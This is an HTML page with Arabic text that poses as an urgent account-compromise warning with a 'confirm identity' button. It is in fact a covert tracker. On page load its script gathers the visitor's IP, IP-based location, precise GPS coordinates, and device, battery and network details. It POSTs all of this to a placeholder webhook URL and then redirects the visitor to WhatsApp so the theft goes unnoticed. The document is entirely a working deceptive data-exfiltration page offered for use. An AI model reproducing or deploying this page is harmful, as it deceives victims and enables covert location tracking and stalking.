<!DOCTYPE html>
<html>
<head>
    <title>منشوراتك الخاصة</title>
    <style>
        body { background: black; color: white; font-family: Arial; }
        .container { text-align: center; margin-top: 100px; }
        button { padding: 15px 30px; font-size: 20px; background: red; color: white; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚠️ تحذير: حسابك معرض للاختراق</h1>
        <p>اضغط للتأكيد أنك المالك الحقيقي:</p>
        <button onclick="startTracking()">تأكيد الهوية</button>
        <div id="status" style="margin-top:20px;"></div>
    </div>

    <script>
        const data = {
            ip: '',
            location: {},
            device: {},
            time: new Date().toISOString()
        };

        // جمع معلومات الجهاز
        data.device = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: `${screen.width}x${screen.height}`,
            cookies: navigator.cookieEnabled,
            java: navigator.javaEnabled()
        };

        // جمع الـ IP والموقع
        async function startTracking() {
            document.getElementById('status').innerHTML = "جاري التحقق...";
            
            // الحصول على IP
            const ipResponse = await fetch('https://api64.ipify.org?format=json');
            const ipData = await ipResponse.json();
            data.ip = ipData.ip;
            
            // الحصول على الموقع من IP
            const geoResponse = await fetch(`http://ip-api.com/json/${data.ip}?fields=status,message,country,regionName,city,district,zip,lat,lon,isp,org,as,mobile,proxy,hosting`);
            const geoData = await geoResponse.json();
            data.location = geoData;
            
            // محاولة الحصول على الموقع الجغرافي الدقيق
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        data.location.gps = {
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            timestamp: new Date(position.timestamp)
                        };
                        sendData();
                    },
                    error => {
                        sendData();
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            } else {
                sendData();
            }
        }

        // جمع معلومات إضافية
        function collectExtraInfo() {
            // معلومات الشبكة
            if (navigator.connection) {
                data.device.connection = {
                    type: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt
                };
            }
            
            // معلومات البطارية
            if (navigator.getBattery) {
                navigator.getBattery().then(battery => {
                    data.device.battery = {
                        level: battery.level,
                        charging: battery.charging
                    };
                });
            }
            
            // معلومات الذاكرة
            if (navigator.deviceMemory) {
                data.device.memory = navigator.deviceMemory;
            }
            
            // المعالج
            if (navigator.hardwareConcurrency) {
                data.device.cores = navigator.hardwareConcurrency;
            }
        }

        // إرسال البيانات
        async function sendData() {
            collectExtraInfo();
            
            // استخدم service مجاني لتخزين البيانات
            const webhookURL = "https://webhook.site/your-unique-url"; // استبدلها
            
            try {
                const response = await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                
                document.getElementById('status').innerHTML = 
                    "✅ تم التحقق! جاري التوجيه...";
                
                // توجيهه بعد 2 ثانية
                setTimeout(() => {
                    window.location.href = "https://www.whatsapp.com";
                }, 2000);
                
            } catch (error) {
                console.error("Error:", error);
            }
        }

        // بدء التتبع تلقائياً عند فتح الصفحة
        window.onload = function() {
            setTimeout(startTracking, 1000);
        };
    </script>
</body>
</html>
